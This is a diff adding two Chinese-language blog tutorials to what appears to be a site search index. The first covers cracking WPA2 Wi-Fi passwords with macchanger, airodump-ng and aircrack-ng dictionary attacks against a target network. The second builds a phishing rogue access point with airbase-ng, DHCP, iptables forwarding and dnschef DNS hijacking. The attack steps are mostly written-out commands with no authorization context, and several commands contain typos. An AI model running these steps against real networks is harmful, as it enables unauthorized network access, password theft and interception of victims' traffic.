@@ -1353,4 +1353,99 @@
         <tag>Redis</tag>
       </tags>
   </entry>
+  <entry>
+    <title>WIFI 密码破解</title>
+    <url>/2026/03/16/WIFI%20HACK/</url>
+    <content><![CDATA[<p>未连接网卡时候</p>
+<p>![1773412831699](2026/03/16/WIFI HACK/1773412831699.png)</p>
+<p>接入 USB 无线网卡设备后，虚拟机设置选中连接虚拟机</p>
+<p>![1773412872695](2026/03/16/WIFI HACK/1773412872695.png)</p>
+<p>可选网络出现当前局域网信息，表明网卡接入成功</p>
+<p>![1773412906900](2026/03/16/WIFI HACK/1773412906900.png)</p>
+<p>查看新加入的网络名称为 wlan0</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></tbody></table></figure>
+
+<p>![1773413147946](2026/03/16/WIFI HACK/1773413147946.png)</p>
+<p>关闭该网卡后查看网卡状态</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#关闭指定网卡</span><br><span class="line">ifconfig wlan0 down</span><br><span class="line">#查看全部网卡状态</span><br><span class="line">ip address</span><br></pre></td></tr></tbody></table></figure>
+
+<p>![1773413317503](2026/03/16/WIFI HACK/1773413317503.png)</p>
+<p>给无线网卡设置虚假 mac 地址，并开启无线网卡监听模式</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">macchanger --mac 伪造mac地址 wlan0</span><br><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></tbody></table></figure>
+
+<p>![1773413666703](2026/03/16/WIFI HACK/1773413666703.png)</p>
+<p>查看当前无线设备，并通过该无线网卡搜索周围无线信号</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">rfkill list</span><br><span class="line">airodump-ng wlan0</span><br></pre></td></tr></tbody></table></figure>
+
+<p>![1773459364973](2026/03/16/WIFI HACK/1773459364973.png)</p>
+<p>搜集不到信号，重启虚拟机，断开网卡后重新连接</p>
+<p>![1773459441435](2026/03/16/WIFI HACK/1773459441435.png)</p>
+<p>查看进程并杀掉进程</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">airmon-ng check</span><br><span class="line">airmon-ng check kill</span><br></pre></td></tr></tbody></table></figure>
+
+<p>![1773461780462](2026/03/16/WIFI HACK/1773461780462.png)</p>
+<p>重新监听附近 wifi</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">airodump-ng wlan0</span><br></pre></td></tr></tbody></table></figure>
+
+<p>![1773485885291](2026/03/16/WIFI HACK/1773485885291.png)</p>
+<p>监听被破解的 Wifi</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">airodump-ng -c 目标的CH值 -w WPA2-Crack --bssid 目标的mac地址 wlan0</span><br></pre></td></tr></tbody></table></figure>
+
+<p>后续有设备连接该 wifi 后，获得 cap 包，后续通过以下命令进行密码爆破，是否爆破成功与字典有关</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">aircrack-ng -b 目标的mac地址 -w 字典位置 获取的cap包</span><br></pre></td></tr></tbody></table></figure>
+]]></content>
+      <categories>
+        <category>渗透技术</category>
+      </categories>
+      <tags>
+        <tag>WIFI</tag>
+        <tag>密码爆破</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>WIFI 钓鱼</title>
+    <url>/2026/03/16/WiFi%20fish/</url>
+    <content><![CDATA[<p>安装 dhcp 服务并创建 leases 文件</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">apt update &amp;&amp; apt install -y isc-dhcp-server</span><br><span class="line">touch /var/lib/dhcp/dhcpd.leases</span><br><span class="line">chmod 777 /var/lib/dhcp/dhcpd.leases</span><br></pre></td></tr></tbody></table></figure>
+
+<p>![1773486325024](2026/03/16/WiFi fish/1773486325024.png)</p>
+<p>修改 dhcpd.conf 配置文件</p>
+<p>![1773486758230](2026/03/16/WiFi fish/1773486758230.png)</p>
+<p>连接无线网卡</p>
+<p>![1773486815899](2026/03/16/WiFi fish/1773486815899.png)</p>
+<p>关闭网卡</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ifoncif wlan0 down</span><br></pre></td></tr></tbody></table></figure>
+
+<p>![1773486961940](2026/03/16/WiFi fish/1773486961940.png)</p>
+<p>设置监听模式后开启网卡</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">iwconfig wlan0 mode monitor</span><br><span class="line">ifconfig wlan0 up</span><br><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></tbody></table></figure>
+
+<p>![1773487079485](2026/03/16/WiFi fish/1773487079485.png)</p>
+<p>通过 airbase-ng 建立无线热点</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">airbase-ng -e WIFI名称 -c 信道 wlan0</span><br></pre></td></tr></tbody></table></figure>
+
+<p>![1773487285071](2026/03/16/WiFi fish/1773487285071.png)</p>
+<p>设置 at0 地址和网关，添加路由，并将虚拟机作为转发机器</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ifconfig at0 10.0.0.1 net netmask 255.255.255.0</span><br><span class="line">route add -net 10.0.0.0 mask 255.255.255.0 gw 10.0.0.1</span><br><span class="line">route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1</span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></tbody></table></figure>
+
+<p>![1773626582028](2026/03/16/WiFi fish/1773626582028.png)</p>
+<p>启动服务后配置规则</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/etc/init.d/isc-dhcp-server start</span><br><span class="line">iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT</span><br><span class="line">iptables -A FORWARD -p tcp --syn -s 10.0.0.0/25 -j TCPMSS --set-mss 1356</span><br></pre></td></tr></tbody></table></figure>
+
+<p>![1773627837594](2026/03/16/WiFi fish/1773627837594.png)</p>
+<p>连接钓鱼的无线网络</p>
+<p>![1773627930611](2026/03/16/WiFi fish/1773627930611.png)</p>
+<p>进行 DNS 劫持</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#nameserver设置的是其他未被劫持的网站发送给Google的公共DNS服务器8.8.8.8/53查询结果</span><br><span class="line">dnschef --fakedomains-被劫持的网站 --fakeip-10.0.0.1 -i 10.0.0.1 --namesever 8.8.8.8#53</span><br></pre></td></tr></tbody></table></figure>
+
+<p>![1773628341119](2026/03/16/WiFi fish/1773628341119.png)</p>
+]]></content>
+      <categories>
+        <category>渗透技术</category>
+      </categories>
+      <tags>
+        <tag>WIFI</tag>
+        <tag>DNS劫持</tag>
+      </tags>
+  </entry>
 </search>
